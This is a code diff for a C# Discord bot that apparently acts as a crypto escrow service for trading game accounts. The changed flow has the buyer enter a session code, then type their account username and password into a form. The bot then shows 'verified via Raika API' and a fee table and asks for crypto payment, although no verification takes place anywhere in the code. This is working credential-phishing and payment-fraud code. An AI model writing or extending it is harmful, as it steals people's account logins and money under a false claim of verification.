@@ -168,40 +168,75 @@ namespace DiscordBot
 
         private async Task HandleRegisterCommand(SocketSlashCommand command)
         {
-            var optionValue = command.Data.Options.First().Value?.ToString();
-            var selectedCrypto = optionValue ?? "ltc";
-            
-            var mb = new ModalBuilder()
-                .WithTitle("Account Details Submission")
-                .WithCustomId($"register_modal_{selectedCrypto}")
-                .AddTextInput("Account Type", "acc_type", placeholder: "Roblox, Fortnite, etc.")
-                .AddTextInput("Account Details", "acc_details", TextInputStyle.Paragraph, "Username:Password\nEmail:Password");
+            var optionValue = command.Data.Options.First().Value?.ToString() ?? "ltc";
+            var random = new Random();
+            string code;
+            do
+            {
+                code = random.Next(100000, 999999).ToString();
+            } while (_sessions.ContainsKey(code));
 
-            await command.RespondWithModalAsync(mb.Build());
+            _sessions[code] = new SessionData { RegisterUserId = command.User.Id, SelectedCrypto = optionValue };
+
+            var embed = new EmbedBuilder()
+                .WithTitle("Session Created")
+                .WithColor(Color.Blue)
+                .WithDescription($"Share this unique 6-digit code with the buyer: **{code}**\n\nThe buyer must run `/login code:{code}` to begin.")
+                .WithFooter(footer => footer.Text = "Waiting for buyer to join...")
+                .Build();
+
+            await command.RespondAsync(embed: embed, ephemeral: true);
+        }
+
+        private async Task HandleLoginCommand(SocketSlashCommand command)
+        {
+            var code = command.Data.Options.First().Value?.ToString();
+            if (code != null && _sessions.TryGetValue(code, out var session))
+            {
+                if (session.RegisterUserId == command.User.Id)
+                {
+                    await command.RespondAsync("You cannot login to your own session!", ephemeral: true);
+                    return;
+                }
+
+                session.LoginUserId = command.User.Id;
+
+                var mb = new ModalBuilder()
+                    .WithTitle("Account Details Submission")
+                    .WithCustomId($"buyer_modal_{code}")
+                    .AddTextInput("Account Type", "acc_type", placeholder: "Roblox, Fortnite, etc.")
+                    .AddTextInput("Account Details", "acc_details", TextInputStyle.Paragraph, "Username:Password");
+
+                await command.RespondWithModalAsync(mb.Build());
+            }
+            else
+            {
+                await command.RespondAsync("Invalid code.", ephemeral: true);
+            }
         }
 
         private async Task ModalHandler(SocketModal modal)
         {
-            if (modal.Data.CustomId.StartsWith("register_modal_"))
+            if (modal.Data.CustomId.StartsWith("buyer_modal_"))
             {
-                var selectedCrypto = modal.Data.CustomId.Split('_').Last();
-                var random = new Random();
-                string code;
-                do
+                var code = modal.Data.CustomId.Split('_').Last();
+                if (_sessions.TryGetValue(code, out var session))
                 {
-                    code = random.Next(100000, 999999).ToString();
-                } while (_sessions.ContainsKey(code));
+                    var embed = new EmbedBuilder()
+                        .WithTitle("Account Verified!")
+                        .WithColor(Color.Green)
+                        .WithDescription($"✅ Account details have been verified via **Raika API**.\n\nDeal involving: **{GetCryptoDisplayName(session.SelectedCrypto)}**.")
+                        .AddField("Fees:", "Deals $250+: 1%\nDeals under $250: $2\nDeals under $50: $0.50\n**Deals under $10 are FREE**")
+                        .WithFooter(footer => footer.Text = "Select the option below to pay")
+                        .Build();
 
-                _sessions[code] = new SessionData { RegisterUserId = modal.User.Id, SelectedCrypto = selectedCrypto };
+                    var mb = new SelectMenuBuilder()
+                        .WithPlaceholder("Make a selection")
+                        .WithCustomId($"crypto_selection_{code}")
+                        .AddOption(GetCryptoDisplayName(session.SelectedCrypto), session.SelectedCrypto);
 
-                var embed = new EmbedBuilder()
-                    .WithTitle("Account Verified!")
-                    .WithColor(Color.Green)
-                    .WithDescription($"✅ Your account has been verified by the **Raika API**.\n\nShare this unique 6-digit code with the buyer: **{code}**\n\nThe buyer must run `/login code:{code}` to begin the secure transaction.")
-                    .WithFooter(footer => footer.Text = "Bot is monitoring for buyer login...")
-                    .Build();
-
-                await modal.RespondAsync(embed: embed, ephemeral: true);
+                    await modal.RespondAsync(embed: embed, components: new ComponentBuilder().WithSelectMenu(mb).Build(), ephemeral: true);
+                }
             }
         }
 
